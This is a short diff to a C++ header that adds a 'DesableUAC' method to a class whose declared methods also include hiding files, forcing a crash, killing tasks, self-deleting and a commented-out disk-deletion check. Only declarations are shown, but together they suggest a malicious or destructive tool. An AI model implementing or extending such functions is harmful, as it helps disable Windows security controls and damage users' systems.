@@ -22,6 +22,7 @@ public:
 	bool WriteOnWhichDiskToRemove(CString DriveLetter);
 	void HideFile(bool bHide);
 	bool EnableCrashOnCtrlScroll();
+	bool DesableUAC();
 	//bool IsDeleteDiskD();
 	bool WriteTaskKillWindows();
 	void SelfDelete();
